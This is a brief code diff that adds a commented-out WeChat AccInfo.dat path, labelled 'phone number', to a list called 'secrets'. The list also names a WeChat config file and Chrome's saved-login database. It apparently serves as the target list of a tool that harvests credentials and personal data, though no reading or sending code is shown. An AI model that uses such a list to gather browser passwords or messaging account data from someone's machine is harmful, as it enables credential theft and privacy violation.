@@ -14,6 +14,7 @@ secrets = [
 
 # wechat id
 '/Documents/WeChat Files/All Users/config/config.data',
+#'/Documents/WeChat Files/{wechat_id}/config/AccInfo.dat',   # phone number
 
 # Something important in Chrome ...
 '/AppData/Local/Google/Chrome/User Data/Default/Login Data',
